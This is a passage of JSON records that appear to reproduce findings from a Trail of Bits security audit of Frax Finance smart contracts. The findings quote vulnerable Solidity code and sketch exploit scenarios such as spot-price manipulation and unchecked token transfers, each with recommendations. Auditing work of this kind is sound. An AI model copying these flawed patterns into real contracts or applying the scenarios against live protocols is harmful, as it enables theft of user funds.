"https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The price_tolerance state variable of the CCFrax1to1AMM contract is set to 50,000, which, when using the xed point scaling factor inconsistent with the variables inline comment, which indicates the number 5,000, corresponding to 0.005. A price tolerance of 0.05 is probably too high and can lead to unacceptable arbitrage activities; this suggests that price_tolerance should be set to the value indicated in the code comment. 6 1 0 , corresponds to 0.05. This is uint256 public price_tolerance = 50000 ; // E6. 5000 = .995 to 1.005 Figure 12.1: The price_tolerance state variable ( CCFrax1to1AMM.sol#56 ) Exploit Scenario This issue exacerbates the exploit scenario presented in issue TOB-FRSOL-008 . Given that scenario, but with a price tolerance of 50,000, Alice is able to gain $5459 through arbitrage. A higher price tolerance leads to higher arbitrage prots. Recommendations Short term, set the price tolerance to 5,000 both in the code and on the deployed contract. Long term, ensure that comments are in sync with the code and that constants are correct.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "13. Signicant code duplication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "Signicant code duplication exists throughout the codebase. Duplicate code can lead to incomplete xes or inconsistent behavior (e.g., because the code is modied in one location but not in all). For example, the FraxUnifiedFarmTemplate.sol and StakingRewardsMultiGauge.sol les both contain a retroCatchUp function. As seen in gure 13.1, the functions are almost identical. // If the period expired, renew it function retroCatchUp () internal { // Pull in rewards from the // If the period expired, renew it function retroCatchUp () internal { // Pull in rewards from the rewards distributor rewards distributor rewards_distributor. distributeReward ( addr ess ( this )); rewards_distributor. distributeReward ( addr ess ( this )); // Ensure the provided reward // Ensure the provided reward amount is not more than the balance in the contract. amount is not more than the balance in the contract. // This keeps the reward rate in // This keeps the reward rate in the right range, preventing overflows due to the right range, preventing overflows due to // very high values of rewardRate // very high values of rewardRate in the earned and rewardsPerToken functions; in the earned and rewardsPerToken functions; // Reward + leftover must be less // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow. than 2^256 / 10^18 to avoid overflow. uint256 num_periods_elapsed = uint256 num_periods_elapsed = uint256 ( block .timestamp - periodFinish) / rewardsDuration; // Floor division to the nearest period uint256 ( block .timestamp. sub (periodFinish) ) / rewardsDuration; // Floor division to the nearest period // Make sure there are enough // Make sure there are enough tokens to renew the reward period tokens to renew the reward period for ( uint256 i = 0 ; i < for ( uint256 i = 0 ; i < rewardTokens.length; i++){ rewardTokens.length; i++){ require (( rewardRates (i) * rewardsDuration * (num_periods_elapsed + 1 )) <= ERC20 (rewardTokens[i]). balanceOf ( address ( this )), string ( abi . encodePacked ( \"Not enough reward tokens available: \" , rewardTokens[i])) ); require ( rewardRates (i). mul (rewardsDuratio n). mul (num_periods_elapsed + 1 ) <= ERC20 (rewardTokens[i]). balanceOf ( address ( this )), string ( abi . encodePacked ( \"Not enough reward tokens available: \" , rewardTokens[i])) ); } } // uint256 old_lastUpdateTime = // uint256 old_lastUpdateTime = lastUpdateTime; lastUpdateTime; // uint256 new_lastUpdateTime = // uint256 new_lastUpdateTime = block.timestamp; block.timestamp; // lastUpdateTime = periodFinish; periodFinish = periodFinish + // lastUpdateTime = periodFinish; periodFinish = ((num_periods_elapsed + 1 ) * rewardsDuration); periodFinish. add ((num_periods_elapsed. add ( 1 )). mul (rewardsDuration)); // Update the rewards and time _updateStoredRewardsAndTime (); _updateStoredRewardsAndTime (); emit // Update the fraxPerLPStored fraxPerLPStored = RewardsPeriodRenewed ( address (stakingToken )); fraxPerLPToken (); } } Figure 13.1: Left: contracts/Staking/FraxUnifiedFarmTemplate.sol#L463-L490 Right: contracts/Staking/StakingRewardsMultiGauge.sol#L637-L662 Exploit Scenario Alice, a Frax Finance developer, is asked to x a bug in the retroCatchUp function. Alice updates one instance of the function, but not both. Eve discovers a copy of the function in which the bug is not xed and exploits the bug. Recommendations Short term, perform a comprehensive code review and identify pieces of code that are semantically similar. Factor out those pieces of code into separate functions where it makes sense to do so. This will reduce the risk that those pieces of code diverge after the code is updated. Long term, adopt code practices that discourage code duplication. Doing so will help to prevent this problem from recurring.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "14. StakingRewardsMultiGauge.recoverERC20 allows token managers to steal rewards ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The recoverERC20 function in the StakingRewardsMultiGauge contract allows token managers to steal rewards. This violates conventions established by other Frax Solidity contracts in which recoverERC20 can be called only by the contract owner. The relevant code appears in gure 14.1. The recoverERC20 function checks whether the caller is a token manager and, if so, sends him the requested amount of the token he manages. Convention states that this function should be callable only by the contract owner. Moreover, its purpose is typically to recover tokens unrelated to the contract. // Added to support recovering LP Rewards and other mistaken tokens from other systems to be distributed to holders function recoverERC20 ( address tokenAddress , uint256 tokenAmount ) external onlyTknMgrs ( tokenAddress ) { // Check if the desired token is a reward token bool isRewardToken = false ; for ( uint256 i = 0 ; i < rewardTokens.length; i++){ if (rewardTokens[i] == tokenAddress) { isRewardToken = true ; break ; } } // Only the reward managers can take back their reward tokens if (isRewardToken && rewardManagers[tokenAddress] == msg.sender ){ ERC20 (tokenAddress). transfer ( msg.sender , tokenAmount); emit Recovered ( msg.sender , tokenAddress, tokenAmount); return ; } Figure 14.1: contracts/Staking/StakingRewardsMultiGauge.sol#L798-L814 For comparison, consider the CCFrax1to1AMM contracts recoverERC20 function. It is callable only by the contract owner and specically disallows transferring tokens used by the contract. function recoverERC20 ( address tokenAddress , uint256 tokenAmount ) external onlyByOwner { require (!is_swap_token[tokenAddress], \"Cannot withdraw swap tokens\" ); TransferHelper. safeTransfer ( address (tokenAddress), msg.sender , tokenAmount); } Figure 14.2: contracts/Misc_AMOs/__CROSSCHAIN/Moonriver/CCFrax1to1AMM.sol#L340-L344 Exploit Scenario Eve tricks Frax Finance into making her a token manager for the StakingRewardsMultiGauge contract. When the contracts token balance is high, Eve withdraws the tokens and vanishes. Recommendations Short term, eliminate the token managers ability to call recoverERC20 . This will bring recoverERC20 in line with established conventions regarding the functions purpose and usage. Long term, regularly review all uses of contract modiers, such as onlyTknMgrs . Doing so will help to expose bugs like the one described here.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "15. Convex_AMO_V2 custodian can withdraw rewards ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The Convex_AMO_V2 custodian can withdraw rewards. This violates conventions established by other Frax Solidity contracts in which the custodian is only able to pause operations. The relevant code appears in gure 15.1. The withdrawRewards function is callable by the contract owner, governance, or the custodian. This provides signicantly more power to the custodian than other contracts in the Frax Solidity repository. function withdrawRewards ( uint256 crv_amt , uint256 cvx_amt , uint256 cvxCRV_amt , uint256 fxs_amt ) external onlyByOwnGovCust { if (crv_amt > 0 ) TransferHelper. safeTransfer (crv_address, msg.sender , crv_amt); if (cvx_amt > 0 ) TransferHelper. safeTransfer ( address (cvx), msg.sender , cvx_amt); if (cvxCRV_amt > 0 ) TransferHelper. safeTransfer (cvx_crv_address, msg.sender , cvxCRV_amt); if (fxs_amt > 0 ) TransferHelper. safeTransfer (fxs_address, msg.sender , fxs_amt); } Figure 15.1: contracts/Misc_AMOs/Convex_AMO_V2.sol#L425-L435 Exploit Scenario Eve tricks Frax Finance into making her the custodian for the Convex_AMO_V2 contract. When the unclaimed rewards are high, Eve withdraws them and vanishes. Recommendations Short term, determine whether the Convex_AMO_V2 custodian requires the ability to withdraw rewards. If so, document this as a security concern. This will help users to understand the risks associated with depositing funds into the Convex_AMO_V2 contract. Long term, implement a mechanism that allows rewards to be distributed without requiring the intervention of an intermediary. Reducing human involvement will increase users overall condence in the system.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "16. The FXS1559 documentation is inaccurate ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The FXS1559 documentation states that excess FRAX tokens are exchanged for FXS tokens, and the FXS tokens are then burned. However, the reality is that those FXS tokens are redistributed to veFXS holders. More specically, the documentation states the following: Specically, every time interval t, FXS1559 calculates the excess value above the CR [collateral ration] and mints FRAX in proportion to the collateral ratio against the value. It then uses the newly minted currency to purchase FXS on FRAX-FXS AMM pairs and burn it. However, in the FXS1559_AMO_V3 contract, the number of FXS tokens that are burned is a tunable parameter (see gures 16.1 and 16.2). The parameter defaults to, and is currently, 0 (according to Etherscan). burn_fraction = 0 ; // Give all to veFXS initially Figure 16.1: contracts/Misc_AMOs/FXS1559_AMO_V3.sol#L87 // Calculate the amount to burn vs give to the yield distributor uint256 amt_to_burn = fxs_received. mul (burn_fraction). div (PRICE_PRECISION); uint256 amt_to_yield_distributor = fxs_received. sub (amt_to_burn); // Burn some of the FXS burnFXS (amt_to_burn); // Give the rest to the yield distributor FXS. approve ( address (yieldDistributor), amt_to_yield_distributor); yieldDistributor. notifyRewardAmount (amt_to_yield_distributor); Figure 16.2: contracts/Misc_AMOs/FXS1559_AMO_V3.sol#L159-L168 Exploit Scenario Frax Finance is publicly shamed for claiming that FXS is deationary when it is not. Condence in FRAX declines, and it loses its peg as a result. Recommendations Short term, correct the documentation to indicate that some proportion of FXS tokens may be distributed to veFXS holders. This will help users to form correct expectations regarding the operation of the protocol. Long term, consider whether FXS tokens need to be redistributed. The documentation makes a compelling argument for burning FXS tokens. Adjusting the code to match the documentation might be a better way of resolving this discrepancy.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "17. Univ3LiquidityAMO defaults the price of collateral to $1 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The Uniswap V3 AMOs default to a price of $1 unless an oracle is set, and it is not clear whether an oracle is or will be set. If the contract lacks an oracle, the contract will return the number of collateral units instead of the price of collateral, meaning that it will value each unit of collateral at $1 instead of the correct price. While this may not be an issue for stablecoins, this pattern is error-prone and unclear. It could introduce errors in the global collateral value of FRAX since the protocol may underestimate (or overestimate) the value of the collateral if the price is above (or below) $1. col_bal_e188 is the balance, not the price, of the tokens. When collatDolarValue is called without an oracle, the contract falls back to valuing each token at $1. function freeColDolVal() public view returns ( uint256 ) { uint256 value_tally_e18 = 0 ; for ( uint i = 0 ; i < collateral_addresses.length; i++){ ERC20 thisCollateral = ERC20(collateral_addresses[i]); uint256 missing_decs = uint256 ( 18 ).sub(thisCollateral.decimals()); uint256 col_bal_e18 = thisCollateral.balanceOf( address ( this )).mul( 10 ** missing_decs); uint256 col_usd_value_e18 = collatDolarValue(oracles[collateral_addresses[i]], col_bal_e18); value_tally_e18 = value_tally_e18.add(col_usd_value_e18); } return value_tally_e18; } Figure 17.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L161-L171 function collatDolarValue (OracleLike oracle, uint256 balance ) public view returns ( uint256 ) { if ( address (oracle) == address ( 0 )) return balance; return balance.mul(oracle.read()).div( 1 ether); } Figure 17.2: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L174-L177 Exploit Scenario The value of a collateral token is $0.50. Instead of incentivizing recollateralization, the protocol indicates that it is adequately collateralized (or overcollateralized). However, the price of the collateral token is half the $1 default value, and the protocol needs to respond to the insucient collateral backing FRAX. Recommendations Short term, integrate the Uniswap V3 AMOs properly with an oracle, and remove the hard-coded price assumptions. Long term, review and test the eect of each pricing function on the global collateral value and ensure that the protocol responds correctly to changes in collateralization.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "18. calc_withdraw_one_coin is vulnerable to manipulation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The showAllocations function determines the amount of collateral in dollars that a contract holds. calc_withdraw_one_coin is a Curve AMM function based on the current state of the pool and changes as trades are made through the pool. This spot price can be manipulated using a ash loan or large trade similar to the one described in TOB-FRSOL-006 . function showAllocations () public view returns (uint256[ 10 ] memory return_arr) { // ------------LP Balance------------ // Free LP uint256 lp_owned = (mim3crv_metapool.balanceOf(address(this))); // Staked in the vault uint256 lp_value_in_vault = MIM3CRVInVault(); lp_owned = lp_owned.add(lp_value_in_vault); // ------------3pool Withdrawable------------ uint256 mim3crv_supply = mim3crv_metapool.totalSupply(); uint256 mim_withdrawable = 0 ; uint256 _3pool_withdrawable = 0 ; if (lp_owned > 0 ) _3pool_withdrawable = mim3crv_metapool.calc_withdraw_one_coin(lp_owned, 1 ); // 1: 3pool index Figure 18.1: contracts/Misc_AMOs/MIM_Convex_AMO.sol#L145-160 Exploit Scenario MIM_Convex_AMO is included in FRAX.globalCollateralValue , and the FraxPoolV3.bonus_rate is nonzero. An attacker manipulates the return value of calc_withdraw_one_coin , causing the protocol to undervalue the collateral and reach a less-than-desired collateralization ratio. The attacker then calls FraxPoolV3.recollateralize , adds collateral, and sells the newly minted FXS tokens, including a bonus, for prot. Recommendations Short term, do not use the Curve AMM spot price to value collateral. Long term, use an oracle or get_virtual_price to reduce the likelihood of manipulation. References  Medium, \"Economic Attack on Harvest FinanceDeep Dive\"", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "19. Incorrect valuation of LP tokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The Frax Protocol uses liquidity pool (LP) tokens as collateral and includes their value in the global collateralization value. In addition to the protocols incorrect inclusion of FRAX as collateral (see TOB-FRSOL-024 ), the calculation of the value pool tokens representing Uniswap V2-like and Uniswap V3 positions is inaccurate. As a result, the global collateralization value could be incorrect. getAmount0ForLiquidity ( getAmount1ForLiquidity) returns the amount, not the value, of token0 (token1) in that price range; the price of FRAX should not be assumed to be $1, for the same reasons outlined in TOB-FRSOL-017 . The userStakedFrax helper function uses the metadata of each Uniswap V3 NFT to calculate the collateral value of the underlying tokens. Rather than using the current range, the function calls getAmount0ForLiquidty using the range set by a liquidity provider. This suggests that the current price of the assets is within the range set by the liquidity provider, which is not necessarily the case. If the market price is outside the given range, the underlying position will contain 100% of one token rather than a portion of both tokens. Thus, the underlying tokens will not be at a 50% allocation at all times, so this assumption is false. The actual redemption value of the NFT is not the same as what was deposited since the underlying token amounts and prices change with market conditions. In short, the current calculation does not update correctly as the price of assets change, and the global collateral value will be wrong. function userStakedFrax (address account ) public view returns (uint256) { uint256 frax_tally = 0 ; LockedNFT memory thisNFT; for (uint256 i = 0 ; i < lockedNFTs[account].length; i++) { thisNFT = lockedNFTs[account][i]; uint256 this_liq = thisNFT.liquidity; if (this_liq > 0 ){ uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(thisNFT.tick_lower); uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(thisNFT.tick_upper); if (frax_is_token0){ frax_tally = frax_tally.add(LiquidityAmounts.getAmount0ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, uint128(thisNFT.liquidity))); } else { frax_tally = frax_tally.add(LiquidityAmounts.getAmount1ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, uint128(thisNFT.liquidity))); } } } // In order to avoid excessive gas calculations and the input tokens ratios. 50% FRAX is assumed // If this were Uni V2, it would be akin to reserve0 & reserve1 math // There may be a more accurate way to calculate the above... return frax_tally.div( 2 ); } Figure 19.1: contracts/Staking/FraxUniV3Farm_Volatile.sol#L241-L263 In addition, the value of Uniswap V2 LP tokens is calculated incorrectly. The return value of getReserves is vulnerable to manipulation, as described in TOB-FRSOL-006 . Thus, the value should not be used to price LP tokens, as the value will vary signicantly when trades are performed through the given pool. Imprecise uctuations in the LP tokens values will result in an inaccurate global collateral value. function lpTokenInfo ( address pair_address ) public view returns ( uint256 [ 4 ] memory return_info) { // Instantiate the pair IUniswapV2Pair the_pair = IUniswapV2Pair(pair_address); // Get the reserves uint256 [] memory reserve_pack = new uint256 []( 3 ); // [0] = FRAX, [1] = FXS, [2] = Collateral ( uint256 reserve0 , uint256 reserve1 , ) = (the_pair.getReserves()); { // Get the underlying tokens in the LP address token0 = the_pair.token0(); address token1 = the_pair.token1(); // Test token0 if (token0 == canonical_frax_address) reserve_pack[ 0 ] = reserve0; else if (token0 == canonical_fxs_address) reserve_pack[ 1 ] = reserve0; else if (token0 == arbi_collateral_address) reserve_pack[ 2 ] = reserve0; // Test token1 if (token1 == canonical_frax_address) reserve_pack[ 0 ] = reserve1; else if (token1 == canonical_fxs_address) reserve_pack[ 1 ] = reserve1; else if (token1 == arbi_collateral_address) reserve_pack[ 2 ] = reserve1; } Figure 19.2: contracts/Misc_AMOs/__CROSSCHAIN/Arbitrum/SushiSwapLiquidityAMO_ARBI.sol #L196-L217 Exploit Scenario The value of LP positions does not reect a sharp decline in the market value of the underlying tokens. Rather than incentivizing recollateralization, the protocol continues to mint FRAX tokens and causes the true collateralization ratio to fall even further. Although the protocol appears to be solvent, due to incorrect valuations, it is not. Recommendations Short term, discontinue the use of LP tokens as collateral since the valuations are inaccurate and misrepresent the amount of collateral backing FRAX. Long term, use oracles to derive the fair value of LP tokens. For Uniswap V2, this means using the constant product to compute the value of the underlying tokens independent of the spot price. For Uniswap V3, this means using oracles to determine the current composition of the underlying tokens that the NFT represents. References   Christophe Michel, \"Pricing LP tokens | Warp Finance hack\" Alpha Finance, \"Fair Uniswap's LP Token Pricing\"", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "20. Missing check of return value of transfer and transferFrom ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "Some tokens, such as BAT, do not precisely follow the ERC20 specication and will return false or fail silently instead of reverting. Because the codebase does not consistently use OpenZeppelins SafeERC20 library, the return values of calls to transfer and transferFrom should be checked. However, return value checks are missing from these calls in many areas of the code, opening the TWAMM contract (the time-weighted automated market maker) to severe vulnerabilities. function provideLiquidity(uint256 lpTokenAmount) external { require (totalSupply() != 0 , 'EC3' ); //execute virtual orders longTermOrders.executeVirtualOrdersUntilCurrentBlock(reserveMap); //the ratio between the number of underlying tokens and the number of lp tokens must remain invariant after mint uint256 amountAIn = lpTokenAmount * reserveMap[tokenA] / totalSupply(); uint256 amountBIn = lpTokenAmount * reserveMap[tokenB] / totalSupply(); ERC20(tokenA).transferFrom( msg.sender , address( this ), amountAIn); ERC20(tokenB).transferFrom( msg.sender , address( this ), amountBIn); [...] Figure 20.1: contracts/FPI/TWAMM.sol#L125-136 Exploit Scenario Frax deploys the TWAMM contract. Pools are created with tokens that do not revert on failure, allowing an attacker to call provideLiquidity and mint LP tokens for free; the attacker does not have to deposit funds since the transferFrom call fails silently or returns false . Recommendations Short term, x the instance described above. Then, x all instances detected by slither . --detect unchecked-transfer . Long term, review the Token Integration Checklist in appendix D and integrate Slither into the projects CI pipeline to prevent regression and catch new instances proactively.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "21. A rewards distributor does not exist for each reward token ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The FraxUnifiedFarmTemplate contracts setGaugeController function (gure 21.1) has the onlyTknMgrs modier. All other functions with the onlyTknMgrs modier set a value in an array keyed only to the calling token managers token index. Except for setGaugeController , which sets the global rewards_distributor state variable, all other functions that set global state variables have the onlyByOwnGov modier. This modier is stricter than onlyTknMgrs , in that it cannot be called by token managers. As a result, any token manager can set the rewards distributor that will be used by all tokens. This exposes the underlying issue: there should be a rewards distributor for each token instead of a single global distributor, and a token manager should be able to set the rewards distributor only for her token. function setGaugeController ( address reward_token_address , address _rewards_distributor_address , address _gauge_controller_address ) external onlyTknMgrs(reward_token_address) { gaugeControllers[rewardTokenAddrToIdx[reward_token_address]] = _gauge_controller_address; rewards_distributor = IFraxGaugeFXSRewardsDistributor(_rewards_distributor_address); } Figure 21.1: The setGaugeController function ( FraxUnifiedFarmTemplate.sol#639642 ) Exploit Scenario Reward manager A calls setGaugeController to set his rewards distributor. Then, reward manager B calls setGaugeController to set his rewards distributor, overwriting the rewards distributor that A set. Later, sync is called, which in turn calls retroCatchUp . As a result, distributeRewards is called on Bs rewards distributor; however, distributeRewards is not called on As rewards distributor. Recommendations Short term, replace the global rewards distributor with an array that is indexed by token index to store rewards distributors, and ensure that the system calls distributeRewards on all reward distributors within the retroCatchUp function. Long term, ensure that token managers cannot overwrite each others settings.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "22. minVeFXSForMaxBoost can be manipulated to increase rewards ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "minVeFXSForMaxBoost is calculated based on the current spot price when a user stakes Uniswap V2 LP tokens. If an attacker manipulates the spot price of the pool prior to staking LP tokens, the reward boost will be skewed upward, thereby increasing the amount of rewards earned. The attacker will earn outsized rewards relative to the amount of liquidity provided. function fraxPerLPToken () public view returns ( uint256 ) { // Get the amount of FRAX 'inside' of the lp tokens uint256 frax_per_lp_token ; // Uniswap V2 // ============================================ { [...] uint256 total_frax_reserves ; ( uint256 reserve0 , uint256 reserve1 , ) = (stakingToken.getReserves()); Figure 22.1: contracts/Staking/FraxCrossChainFarmSushi.sol#L242-L250 function userStakedFrax ( address account ) public view returns ( uint256 ) { return (fraxPerLPToken()).mul(_locked_liquidity[account]).div(1e18); } function minVeFXSForMaxBoost ( address account ) public view returns ( uint256 ) { return (userStakedFrax(account)).mul(vefxs_per_frax_for_max_boost).div(MULTIPLIER_PRECISION ); } function veFXSMultiplier ( address account ) public view returns ( uint256 ) { if ( address (veFXS) != address ( 0 )){ // The claimer gets a boost depending on amount of veFXS they have relative to the amount of FRAX 'inside' // of their locked LP tokens uint256 veFXS_needed_for_max_boost = minVeFXSForMaxBoost(account); [...] Figure 22.2: contracts/Staking/FraxCrossChainFarmSushi.sol#L260-L272 Exploit Scenario An attacker sells a large amount of FRAX through the incentivized Uniswap V2 pool, increasing the amount of FRAX in the reserve. In the same transaction, the attacker calls stakeLocked and deposits LP tokens. The attacker's reward boost, new_vefxs_multiplier , increases due to the large trade, giving the attacker outsized rewards. The attacker then swaps his tokens back through the pool to prevent losses. Recommendations Short term, do not use the Uniswap spot price to calculate reward boosts. Long term, use canonical and audited rewards contracts for Uniswap V2 liquidity mining, such as MasterChef.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "23. Most collateral is not directly redeemable by depositors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The following describes the on-chain situation on December 20, 2021. The Frax stablecoin has a total supply of 1.5 billion FRAX. Anyone can mint new FRAX tokens by calling FraxPoolV3.mintFrax and paying the necessary amount of collateral and FXS. Conversely, anyone can redeem his or her FRAX for collateral and FXS by calling FraxPoolV3.redeemFrax . However, the Frax team manually moves collateral from the FraxPoolV3 contract into AMO contracts in which the collateral is used to generate yield. As a result, only $5 million (0.43%) of the collateral backing FRAX remains in the FraxPoolV3 contract and is available for redemption. If those $5 million are redeemed, the Frax Finance team would have to manually move collateral from the AMOs to FraxPoolV3 to make further redemptions possible. Currently, $746 million (64%) of the collateral backing FRAX is managed by the ConvexAMO contract. FRAX owners cannot access the ConvexAMO contract, as all of its operations can be executed only by the Frax team. Exploit Scenario Owners of FRAX want to use the FraxPoolV3 contracts redeemFrax function to redeem more than $5 million worth of FRAX for the corresponding amount of collateral. The redemption fails, as only $5 million worth of USDC is in the FraxPoolV3 contract. From the redeemers' perspectives, FRAX is no longer exchangeable into something worth $1, removing the base for its stable price. Recommendations Short term, deposit more FRAX into the FraxPoolV3 contract so that the protocol can support a larger volume of redemptions without requiring manual intervention by the Frax team. Long term, implement a mechanism whereby the pools can retrieve FRAX that is locked in AMOs to pay out redemptions.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "24. FRAX.globalCollateralValue counts FRAX as collateral ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "Each unit of FRAX represents $1 multiplied by the collateralization ratio of debt. That is, if the collateralization ratio is 86%, the Frax Protocol owes each holder of FRAX $0.86. Instead of accounting for this as a liability, the protocol includes this debt as an asset backing FRAX. In other words, FRAX is backed in part by FRAX. Because the FRAX.globalCollateralValue includes FRAX as an asset and not debt, the true collateralization ratio is lower than stated, and users cannot redeem FRAX for the underlying collateral in mass for reasons beyond those described in TOB-FRSOL-023 . This issue occurs extensively throughout the code. For instance, the amount FRAX in a Uniswap V3 liquidity position is included in the contracts collateral value. function TotalLiquidityFrax () public view returns ( uint256 ) { uint256 frax_tally = 0 ; Position memory thisPosition; for ( uint256 i = 0 ; i < positions_array.length; i++) { thisPosition = positions_array[i]; uint128 this_liq = thisPosition.liquidity; if (this_liq > 0 ){ uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(thisPosition.tickLower); uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(thisPosition.tickUpper); if (thisPosition.collateral_address > 0x853d955aCEf822Db058eb8505911ED77F175b99e ){ // if address(FRAX) < collateral_address, then FRAX is token0 frax_tally = frax_tally.add(LiquidityAmounts.getAmount0ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, this_liq)); } else { frax_tally = frax_tally.add(LiquidityAmounts.getAmount1ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, this_liq)); } } } Figure 24.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L199-L216 In another instance, the value of FRAX in FRAX/token liquidity positions on Arbitrum is counted as collateral. Again, FRAX should be counted as debt and not collateral. function lpTokenInfo ( address pair_address ) public view returns ( uint256 [ 4 ] memory return_info) { // Instantiate the pair IUniswapV2Pair the_pair = IUniswapV2Pair(pair_address); // Get the reserves uint256 [] memory reserve_pack = new uint256 []( 3 ); // [0] = FRAX, [1] = FXS, [2] = Collateral ( uint256 reserve0 , uint256 reserve1 , ) = (the_pair.getReserves()); { // Get the underlying tokens in the LP address token0 = the_pair.token0(); address token1 = the_pair.token1(); // Test token0 if (token0 == canonical_frax_address) reserve_pack[ 0 ] = reserve0; else if (token0 == canonical_fxs_address) reserve_pack[ 1 ] = reserve0; else if (token0 == arbi_collateral_address) reserve_pack[ 2 ] = reserve0; // Test token1 if (token1 == canonical_frax_address) reserve_pack[ 0 ] = reserve1; else if (token1 == canonical_fxs_address) reserve_pack[ 1 ] = reserve1; else if (token1 == arbi_collateral_address) reserve_pack[ 2 ] = reserve1; } // Get the token rates return_info[ 0 ] = (reserve_pack[ 0 ] * 1e18) / (the_pair.totalSupply()); return_info[ 1 ] = (reserve_pack[ 1 ] * 1e18) / (the_pair.totalSupply()); return_info[ 2 ] = (reserve_pack[ 2 ] * 1e18) / (the_pair.totalSupply()); // Set the pair type (used later) if (return_info[ 0 ] > 0 && return_info[ 1 ] == 0 ) return_info[ 3 ] = 0 ; // FRAX/XYZ else if (return_info[ 0 ] == 0 && return_info[ 1 ] > 0 ) return_info[ 3 ] = 1 ; // FXS/XYZ else if (return_info[ 0 ] > 0 && return_info[ 1 ] > 0 ) return_info[ 3 ] = 2 ; // FRAX/FXS else revert( \"Invalid pair\" ); } Figure 24.2: contracts/Misc_AMOs/__CROSSCHAIN/Arbitrum/SushiSwapLiquidityAMO_ARBI.sol #L196-L229 Exploit Scenario Users attempt to redeem FRAX for USDC, but the collateral backing FRAX is, in part, FRAX itself, and not enough collateral is available for redemption. The collateralization ratio does not accurately reect when the protocol is insolvent. That is, it indicates that FRAX is fully collateralized in the scenario in which 100% of FRAX is backed by FRAX. Recommendations Short term, revise FRAX.globalCollateralValue so that it does not count FRAX as collateral, and ensure that the protocol deposits the necessary amount of collateral to ensure the collateralization ratio is reached. Long term, after xing this issue, continue reviewing how the protocol accounts for collateral and ensure the design is sound.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "17. Univ3LiquidityAMO defaults the price of collateral to $1 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The Uniswap V3 AMOs default to a price of $1 unless an oracle is set, and it is not clear whether an oracle is or will be set. If the contract lacks an oracle, the contract will return the number of collateral units instead of the price of collateral, meaning that it will value each unit of collateral at $1 instead of the correct price. While this may not be an issue for stablecoins, this pattern is error-prone and unclear. It could introduce errors in the global collateral value of FRAX since the protocol may underestimate (or overestimate) the value of the collateral if the price is above (or below) $1. col_bal_e188 is the balance, not the price, of the tokens. When collatDolarValue is called without an oracle, the contract falls back to valuing each token at $1. function freeColDolVal() public view returns ( uint256 ) { uint256 value_tally_e18 = 0 ; for ( uint i = 0 ; i < collateral_addresses.length; i++){ ERC20 thisCollateral = ERC20(collateral_addresses[i]); uint256 missing_decs = uint256 ( 18 ).sub(thisCollateral.decimals()); uint256 col_bal_e18 = thisCollateral.balanceOf( address ( this )).mul( 10 ** missing_decs); uint256 col_usd_value_e18 = collatDolarValue(oracles[collateral_addresses[i]], col_bal_e18); value_tally_e18 = value_tally_e18.add(col_usd_value_e18); } return value_tally_e18; } Figure 17.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L161-L171 function collatDolarValue (OracleLike oracle, uint256 balance ) public view returns ( uint256 ) { if ( address (oracle) == address ( 0 )) return balance; return balance.mul(oracle.read()).div( 1 ether); } Figure 17.2: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L174-L177 Exploit Scenario The value of a collateral token is $0.50. Instead of incentivizing recollateralization, the protocol indicates that it is adequately collateralized (or overcollateralized). However, the price of the collateral token is half the $1 default value, and the protocol needs to respond to the insucient collateral backing FRAX. Recommendations Short term, integrate the Uniswap V3 AMOs properly with an oracle, and remove the hard-coded price assumptions. Long term, review and test the eect of each pricing function on the global collateral value and ensure that the protocol responds correctly to changes in collateralization. 18. calc_withdraw_one_coin is vulnerable to manipulation Severity: High Diculty: High Type: Data Validation Finding ID: TOB-FRSOL-018 Target: MIM_Convex_AMO.sol", "labels": ["Trail of Bits", 